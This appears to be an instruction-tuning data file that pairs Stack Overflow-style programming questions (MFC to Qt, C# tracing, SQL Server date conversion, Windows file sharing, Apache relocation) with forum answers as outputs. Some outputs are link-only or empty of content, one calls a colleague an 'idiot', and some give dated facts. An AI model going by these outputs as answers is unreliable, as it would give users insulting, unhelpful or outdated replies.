{"instruction": "We currently maintain a suit of MFC applications that are fairly well designed, however the user interface is beginning to look tired and a lot of the code is in need quite a bit of refactoring to tidy up some duplication and/or performance problems.  We make use of quite a few custom controls that handle all their own drawing (all written using MFC).\nRecently I've been doing more research into Qt and the benefits it provides (cross-platform and supports what you might call a more \"professional\" looking framework for UI development).\nMy question is - what would be the best approach to perhaps moving to the Qt framework?  Does Qt play nice with MFC?  Would it be better to start porting some of our custom controls to Qt and gradually integrate more and more into our existing MFC apps? (is this possible?).\nAny advice or previous experience is appreciated.", "output": "(This doesn't really answer your specific questions but...)\nI haven't personally used Qt, but it's not free for commercial Windows development.\nHave you looked at wxWindows which is free? Nice article here. Just as an aside, if you wanted a single code base for all platforms, then you may have to migrate away from MFC - I am pretty sure (someone will correct if wrong) that MFC only targets Windows.\nOne other option would be to look at the Feature Pack update to MFC in SP1 of VS2008 - it includes access to new controls, including the Office style ribbon controls."}
{"instruction": "I want to introduce some tracing to a C# application I am writing. Sadly, I can never really remember how it works and would like a tutorial with reference qualities to check up on every now and then. It should include:\n\nApp.config / Web.config stuff to add for registering TraceListeners\nhow to set it up in the calling application\n\nDo you know the uber tutorial that we should link to?\nEDIT: Glenn Slaven pointed me in the right direction. Add this to your App.config/Web.config inside <configuration/>:\n<system.diagnostics>\n    <trace autoflush=\"true\">\n      <listeners>\n        <add type=\"System.Diagnostics.TextWriterTraceListener\" name=\"TextWriter\"\n             initializeData=\"trace.log\" />\n      </listeners>\n    </trace>\n</system.diagnostics>\n\nThis will add a TextWriterTraceListener that will catch everything you send to with Trace.WriteLine etc.\nEDIT: @DanEsparza pointed out that you should use Trace.TraceInformation, Trace.TraceWarning and Trace.TraceError instead of Trace.WriteLine, as they allow you to format messages the same way as string.Format.\nTip: If you don't add any listeners, then you can still see the trace output with the SysInternals program DebugView (Dbgview.exe): http://technet.microsoft.com/en-us/sysinternals/bb896647.aspx", "output": "Don't know if this link will help you?\nhttp://www.codeguru.com/csharp/.net/net_debugging/tracing/article.php/c5919/"}
{"instruction": "We currently maintain a suit of MFC applications that are fairly well designed, however the user interface is beginning to look tired and a lot of the code is in need quite a bit of refactoring to tidy up some duplication and/or performance problems.  We make use of quite a few custom controls that handle all their own drawing (all written using MFC).\nRecently I've been doing more research into Qt and the benefits it provides (cross-platform and supports what you might call a more \"professional\" looking framework for UI development).\nMy question is - what would be the best approach to perhaps moving to the Qt framework?  Does Qt play nice with MFC?  Would it be better to start porting some of our custom controls to Qt and gradually integrate more and more into our existing MFC apps? (is this possible?).\nAny advice or previous experience is appreciated.", "output": "It's a tricky problem, and I suspect that the answer depends on how much time you have. You will get a much better result if you port your custom controls to Qt - if you use the QStyle classes to do the actual drawing then you'll end up with theme-able code right out of the box.\nIn general, my advice would be to bite the bullet and go the whole way at once. Sure, it might take  longer, but the alternative is to spend an age trying to debug code that doesn't quite play ball, and end up writing more code to deal with minor incompatibilities between the two systems (been there, done that).\nSo, to summarise, my advice is to start a branch and rip out all your old MFC code and replace it with Qt. You'll get platform independence (almost) for free, and while it will take a while, you'll end up with a much nicer product at the end of it.\nOne final word of warning: make sure you take the time to understand the \"Qt way of doing things\" - in some cases it can be quite different to the MFC approach - the last thing you want to do is to end up with MFC-style Qt code."}
{"instruction": "I want to introduce some tracing to a C# application I am writing. Sadly, I can never really remember how it works and would like a tutorial with reference qualities to check up on every now and then. It should include:\n\nApp.config / Web.config stuff to add for registering TraceListeners\nhow to set it up in the calling application\n\nDo you know the uber tutorial that we should link to?\nEDIT: Glenn Slaven pointed me in the right direction. Add this to your App.config/Web.config inside <configuration/>:\n<system.diagnostics>\n    <trace autoflush=\"true\">\n      <listeners>\n        <add type=\"System.Diagnostics.TextWriterTraceListener\" name=\"TextWriter\"\n             initializeData=\"trace.log\" />\n      </listeners>\n    </trace>\n</system.diagnostics>\n\nThis will add a TextWriterTraceListener that will catch everything you send to with Trace.WriteLine etc.\nEDIT: @DanEsparza pointed out that you should use Trace.TraceInformation, Trace.TraceWarning and Trace.TraceError instead of Trace.WriteLine, as they allow you to format messages the same way as string.Format.\nTip: If you don't add any listeners, then you can still see the trace output with the SysInternals program DebugView (Dbgview.exe): http://technet.microsoft.com/en-us/sysinternals/bb896647.aspx", "output": "DotNetCoders has a starter article on it: http://www.dotnetcoders.com/web/Articles/ShowArticle.aspx?article=50, they talk about how to set up the switches in the config file & how to write the code, but it is pretty old (2002).  There's another article on CodeProject: http://www.codeproject.com/KB/trace/debugtreatise.aspx but it's the same age.\nCodeGuru has another article on custom TraceListeners: http://www.codeguru.com/columns/vb/article.php/c5611 \nI can't think of any more recent articles, hopefully someone else here will have something"}
{"instruction": "On my Vista machine I cannot install the .Net framework 3.5 SP1. Setup ends few moments after ending the download of the required files, stating in the log that: \n[08/26/08,09:46:11] Microsoft .NET Framework 2.0SP1 (CBS): [2] Error: Installation failed for component Microsoft .NET Framework 2.0SP1 (CBS). MSI returned error code 1\n[08/26/08,09:46:13] WapUI: [2] DepCheck indicates Microsoft .NET Framework 2.0SP1 (CBS) is not installed.\n\nFirst thing I did was trying to install 2.0 SP1, but this time setup states that the \"product is not supported on Vista system\". Uhm.\nThe real big problem is that this setup fails also when it is called by the Visual Studio 2008 SP1.\nNow, I searched the net for this, but I'm not finding a real solution... Any idea / hint? Did anybody have problems during SP1 install?\nThanks", "output": "Here is an article describing what might be your problem."}
{"instruction": "On my Vista machine I cannot install the .Net framework 3.5 SP1. Setup ends few moments after ending the download of the required files, stating in the log that: \n[08/26/08,09:46:11] Microsoft .NET Framework 2.0SP1 (CBS): [2] Error: Installation failed for component Microsoft .NET Framework 2.0SP1 (CBS). MSI returned error code 1\n[08/26/08,09:46:13] WapUI: [2] DepCheck indicates Microsoft .NET Framework 2.0SP1 (CBS) is not installed.\n\nFirst thing I did was trying to install 2.0 SP1, but this time setup states that the \"product is not supported on Vista system\". Uhm.\nThe real big problem is that this setup fails also when it is called by the Visual Studio 2008 SP1.\nNow, I searched the net for this, but I'm not finding a real solution... Any idea / hint? Did anybody have problems during SP1 install?\nThanks", "output": "I also experienced it on my XP.\nI searched for it, and the result was that some kind of beta .NET remained on my PC.\nThere is a tool to remove all .NET framework from the system. I run it and after it I successfully installed 3.5 SP1."}
{"instruction": "I've found a few resources on the subject, but they all require a deep understanding of SmallTalk or Haskell, neither of which I know.", "output": "Here are some parser combinator libraries in more mainstream languages:\n\nSpirit (C++)\nJparsec (Java)"}
{"instruction": "I have to develop an application which parses a log file and sends specific data to a server. It has to run on both Linux and Windows. \nThe problem appears when I want to test the log rolling system (which appends .1 to the name of the creates a new one with the same name). On Windows (haven't tested yet on Linux) I can't rename a file that I have opened with std::ifstream() (exclusive access?) even if I open it in \"input mode\" (ios::in).\nIs there a cross-platform way to open file in a non-exclusive way?", "output": "It's not the reading operation that's requiring the exclusive mode, it's the rename, because this is essentially the same as moving the file to a new location.\nI'm not sure but I don't think this can be done. Try copying the file instead, and later delete/replace the old file when it is no longer read."}
{"instruction": "I have to develop an application which parses a log file and sends specific data to a server. It has to run on both Linux and Windows. \nThe problem appears when I want to test the log rolling system (which appends .1 to the name of the creates a new one with the same name). On Windows (haven't tested yet on Linux) I can't rename a file that I have opened with std::ifstream() (exclusive access?) even if I open it in \"input mode\" (ios::in).\nIs there a cross-platform way to open file in a non-exclusive way?", "output": "Win32 filesystem semantics require that a file you rename not be open (in any mode) at the time you do the rename. You will need to close the file, rename it, and then create the new log file.\nUnix filesystem semantics allow you to rename a file that's open because the filename is just a pointer to the inode."}
{"instruction": "I have to develop an application which parses a log file and sends specific data to a server. It has to run on both Linux and Windows. \nThe problem appears when I want to test the log rolling system (which appends .1 to the name of the creates a new one with the same name). On Windows (haven't tested yet on Linux) I can't rename a file that I have opened with std::ifstream() (exclusive access?) even if I open it in \"input mode\" (ios::in).\nIs there a cross-platform way to open file in a non-exclusive way?", "output": "If you are only reading from the file I know it can be done with windows api CreateFile. Just specify FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE as the input to dwShareMode.\nUnfortunally this is not crossplatform. But there might be something similar for Linux.\nSee msdn for more info on CreateFile.\nEDIT: Just a quick note about Greg Hewgill comment. I've just tested with the FILE_SHARE* stuff (too be 100% sure). And it is possible to both delete and rename files in windows if you open read only and specify the FILE_SHARE* parameters."}
{"instruction": "When opening a file from your hard drive into your browser, where is the document root?  To illustrate, given the following HTML code, if the page is opened from the local machine(file:///) then where should the css file be for the browser to find it?\n<link href=\"/temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />", "output": "As far as local, static html goes, unless you specify it, most browsers will take the location of the html file you are viewing as the root. So any css put in there can just be referenced by it's name only. \nThe lazy way to get the correct reference for your css file is to open it in your browser. Then just grab the url that you see there - something like: file:///blah/test.css and copy that into your stylesheet link on your html: <link href=\"file:///blah/test.css\" rel=\"stylesheet\" type=\"text/css\">\nEither that or you can just take the url for the html file and amend it to refer to the stylesheet.\nThen your local page should load fine with the local stylesheet."}
{"instruction": "When opening a file from your hard drive into your browser, where is the document root?  To illustrate, given the following HTML code, if the page is opened from the local machine(file:///) then where should the css file be for the browser to find it?\n<link href=\"/temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />", "output": "Erick,\nIf you're interested in setting the document root, you might look at getting a web server installed on your machine, or, if you already have one (like Apache or IIS), storing your project-in-development in the web root of that server (htdocs in Apache, not entirely sure in IIS). If you'd rather leave your files where they are, you can set up virtual hosts and even map them to addresses that you can type into your browser (for example, I have a local.mrwarshaw.com address that resolves to the web root of my personal site's development folder).\nIf you're on Windows and don't want to mess around with setting up a server on your own, you could get a package like XAMPP or WAMPP, though bear in mind that those carry the extra weight of PHP and MySQL with them. Still, if you've got the space, they're a pretty easy drop-in development environment for your machine."}
{"instruction": "I have to develop an application which parses a log file and sends specific data to a server. It has to run on both Linux and Windows. \nThe problem appears when I want to test the log rolling system (which appends .1 to the name of the creates a new one with the same name). On Windows (haven't tested yet on Linux) I can't rename a file that I have opened with std::ifstream() (exclusive access?) even if I open it in \"input mode\" (ios::in).\nIs there a cross-platform way to open file in a non-exclusive way?", "output": "Is there a way to open file in a non-exclusive way,\n\nYes, using Win32, passing the various FILE_SHARE_Xxxx flags to CreateFile.\n\nis it cross platform?\n\nNo, it requires platform-specific code.\nDue to annoying backwards compatibility concerns (DOS applications, being single-tasking, assume that nothing can delete a file out from under them, i.e. that they can fclose() and then fopen() without anything going amiss; Win16 preserved this assumption to make porting DOS applications easier, Win32 preserved this assumption to make porting Win16 applications easier, and it's awful), Windows defaults to opening files exclusively.\nThe underlying OS infrastructure supports deleting/renaming open files  (although I believe it does have the restriction that memory-mapped files cannot be deleted, which I think isn't a restriction found on *nix), but the default opening semantics do not.\nC++ has no notion of any of this; the C++ operating environment is much the same as the DOS operating environment--no other applications running concurrently, so no need to control file sharing."}
{"instruction": "We currently maintain a suit of MFC applications that are fairly well designed, however the user interface is beginning to look tired and a lot of the code is in need quite a bit of refactoring to tidy up some duplication and/or performance problems.  We make use of quite a few custom controls that handle all their own drawing (all written using MFC).\nRecently I've been doing more research into Qt and the benefits it provides (cross-platform and supports what you might call a more \"professional\" looking framework for UI development).\nMy question is - what would be the best approach to perhaps moving to the Qt framework?  Does Qt play nice with MFC?  Would it be better to start porting some of our custom controls to Qt and gradually integrate more and more into our existing MFC apps? (is this possible?).\nAny advice or previous experience is appreciated.", "output": "In my company, we are currently using Qt and are very happy with it.\nI personnally never had to move a MFC-app into using the Qt framework, but here is something which might be of some interest for you :\nQt/MFC Migration Framework\nQt/MFC Migration Framework\nIt's part of Qt-Solutions, so this means you'll have to buy a Qt license along with a Qt-Solutions license. (edit: not any more)\nI hope this helps !"}
{"instruction": "So far I have encountered adjacency list, nested sets and nested intervals as models for storing tree structures in a database. I know these well enough and have migrated trees from one to another.\nWhat are other popular models? What are their characteristics? What are good resources (books, web, etc) on this topic?\nI'm not only looking for db storage but would like to expand my knowledge on trees in general. For example, I understand that nested sets/intervals are especially favorable for relational database storage and have asked myself, are they actually a bad choice in other contexts?", "output": "A variation is where you use a direct hierarchical representation (ie. parent link in node), but also store a path value.\nie. for a directory tree consisting of the following:\nC:\\\n   Temp\n   Windows\n       System32\n\nYou would have the following nodes\nKey     Name     Parent     Path\n1       C:                  *1*\n2       Temp       1        *1*2*\n3       Windows    1        *1*3*\n4       System32   3        *1*3*4*\n\nPath is indexed, and will allow you to quickly do a query that picks up a node and all its children, without having to manipulate ranges.\nie. to find C:\\Temp and all its children:\nWHERE Path LIKE '*1*2*%'\n\nThis representation is the only place I can think of where storing id's in a string like this is ok."}
{"instruction": "As part of our product release we ship Apache HTTP Server binaries that we have compiled on our (UNIX) development machine.\nWe tell our clients to install the binaries (on their UNIX servers) under the same directory structure that we compiled it under. For some clients this is not appropriate, e.g. where there are restrictions on where they can install software on their servers and they don't want to compile Apache themselves.\nIs there a way of compiling Apache HTTP Server so its installation location(s) can be specified dynamically using environment variables ?\nI spent a few days trying to sort this out and couldn't find a way to do it. It led me to believe that the Apache binaries were hard coding some directory paths at compilation preventing the portability we require.\nHas anyone managed to do this ?", "output": "If you are compiling Apache2 for a particular location but want your clients to be able to install it somewhere else (and I'm assuming they have the same architecture and OS as your build machine) then you can do it but the apachectl script will need some after-market hacking.\nI just tested these steps:\n\nUnpacked the Apache2 source (this should work with Apache 1.3 as well though) and ran ./configure --prefix=/opt/apache2\nRan make then sudo make install to install on the build machine.\nSwitch to the install directory (/opt/apache2) and tar and gzip up the binaries and config files. I used cd /opt/apache2; sudo tar cf - apache2 | gzip -c > ~/apache2.tar.gz\nMove the tar file to the target machine. I decided to install in /opt/mynewdir/dan/apache2 to test. So basically, your clients can't use rpm or anything like that -- unless you know how to make that relocatable (I don't :-) ).\nAnyway, your client's conf/httpd.conf file will be full of hard-coded absolute paths -- they can just change these to whatever they need. The apachectl script also has hard coded paths. It's just a shell script so you can hack it or give them a sed script to convert the old paths from your build machine to the new path on your clients.\nI skipped all that hackery and just ran ./bin/httpd -f /opt/mynewdir/dan/conf/httpd.conf :-)\n\nHope that helps. Let us know any error messages you get if it's not working for you."}
{"instruction": "I want to compare 2 arrays of objects in JavaScript code.  The objects have 8 total properties, but each object will not have a value for each, and the arrays are never going to be any larger than 8 items each, so maybe the brute force method of traversing each and then looking at the values of the 8 properties is the easiest way to do what I want to do, but before implementing, I wanted to see if anyone had a more elegant solution. Any thoughts?", "output": "Honestly, with 8 objects max and 8 properties max per object, your best bet is to just traverse each object and make the comparisons directly.  It'll be fast and it'll be easy.\nIf you're going to be using these types of comparisons often, then I agree with Jason about JSON serialization...but otherwise there's no need to slow down your app with a new library or JSON serialization code."}
{"instruction": "We often hear/read that one should avoid dynamic casting. I was wondering what would be 'good use' examples of it, according to you?\nEdit:\nYes, I'm aware of that other thread: it is indeed when reading one of the first answers there that I asked my question!", "output": "My current toy project uses dynamic_cast twice; once to work around the lack of multiple dispatch in C++ (it's a visitor-style system that could use multiple dispatch instead of the dynamic_casts), and once to special-case a specific subtype.\nBoth of these are acceptable, in my view, though the former at least stems from a language deficit.  I think this may be a common situation, in fact; most dynamic_casts (and a great many \"design patterns\" in general) are workarounds for specific language flaws rather than something that aim for."}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "I would suggest cleaning up the mess and changing the column to a datetime because doing stuff like this\nWHERE datediff(dd, convert(datetime, lastUpdate), getDate()) < 31\n\ncannot use an index and it will be many times slower than if you had a datetime colum,n and did\nwhere lastUpdate > getDate() -31\n\nYou also need to take into account hours and seconds of course"}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "In your convert call, you need to specify a third style parameter, e.g., the format of the datetimes that are stored as varchar, as specified in this document: CAST and CONVERT (T-SQL)"}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "Print out the records. Give the hardcopy to the idiot who decided to use a varchar(50) and ask them to find the problem record.\nNext time they might just see the point of choosing an appropriate data type."}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "This is all starting to sound a bit like Yesterday's TDWTF. :-)"}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "If you consider a warning (which is what [Obsolete] throws up) build-breaking, then just use the #warning compiler directive.\nEdit: I've never used it, but #error is also available."}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "The problem is most likely how the data is stored, there are only two safe formats\nISO YYYYMMDD\nISO 8601 yyyy-mm-dd Thh:mm:ss:mmm(no spaces)\nthese will work no matter what your language is.\nYou might need to do a SET DATEFORMAT YMD (or whatever the data is stored as) to make it work"}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "We do that at work, its just easier to find stuff if the class and files have the same name. As for performance, you really shouldn't have 5000 classes in a single project. If you do, some refactoring might be in order.\nThat said, there are instances when we have multiple classes in one file. And that is when it's just a private helper class for the main class of the file."}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "How about writing a cursor to loop through the contents, attempting the cast for each entry?\nWhen an error occurs, output the primary key or other identifying details for the problem record.\nI can't think of a set-based way to do this.\nEdit - ah yes, I forgot about ISDATE(). Definitely a better approach than using a cursor. +1 to SQLMenace."}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "It's common practice to do this, especially to be able to include .h in the files that need it. Of course the performance is affected but try not to think about this problem until it arises :).\nIt's better to start with the files separated and after that try to merge the .h's that are commonly used together to improve performance if you really need to. It all comes down to dependencies between files and this is very specific to each project."}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "Place the CASE and ISDATE inside the CONVERT() function.\n\nSELECT COUNT(*) FROM MyTable\nWHERE\n    DATEDIFF(dd, CONVERT(DATETIME, CASE IsDate(lastUpdate) when 1 then lastUpdate ELSE  '12-30-1899' end), getDate()) < 31\n\nReplace '12-30-1899' with the default date of your choice."}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "Wouldn't the isdate() check take care of this?\n\nRun this to see what happens\nselect isdate('20080131')\nselect isdate('01312008')"}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "Why not just make something up?  An unknown attribute would surely break the build.\n[MyMadeUpAttributeThatBreaksTheBuildForSure]\npublic class NotDoneYet {}"}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "+1 for separation.  I just came onto a project where some classes are in files with a different name, or lumped in with another class, and it is impossible to find these in a quick and efficient manner.  You can throw more resources at a build - you can't make up lost programmer time because (s)he can't find the right file to edit."}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "The same rule applies here, but it notes a few exceptions where it is allowed Like so:\n\nInheritance trees\nClasses that are only used within a very limited scope\nSome Utilities are simply placed in a general 'utils.h'"}
